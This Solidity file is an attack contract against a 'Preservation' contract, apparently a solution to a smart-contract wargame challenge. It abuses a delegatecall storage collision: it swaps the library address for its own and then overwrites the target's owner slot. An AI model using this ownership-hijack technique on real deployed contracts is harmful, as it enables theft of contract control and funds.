// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Hack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;


    function attack(Preservation target) external {
        target.setFirstTime(uint256(uint160(address(this))));
        target.setFirstTime(uint256(uint160(msg.sender)));
        require(target.owner() == msg.sender, "doesnt work");
    }

    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}

interface Preservation {
    function setFirstTime(uint256 _time) external;
    function timeZone1Library() external view returns (address);
    function owner() external view returns (address);
}
